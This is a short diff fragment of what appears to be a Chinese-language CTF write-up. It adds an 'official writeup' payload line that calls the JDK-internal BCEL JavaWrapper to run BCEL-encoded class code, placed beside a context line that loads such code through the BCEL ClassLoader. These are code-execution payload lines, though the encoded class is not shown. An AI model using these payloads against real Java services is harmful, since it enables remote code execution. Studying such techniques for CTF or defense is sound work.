@@ -305,6 +305,14 @@ public static void main(String[] args) throws Exception {
 newInstance(loadClass(com.sun.org.apache.bcel.internal.util.ClassLoader.new(),BCEL_Code))
 ```
 
+官方wp：
+
+```java
+runMain(com.sun.org.apache.bcel.internal.util.JavaWrapper.new(),BCEL_Code,'')
+```
+
+
+
 其他一些想法：
 
 ```java
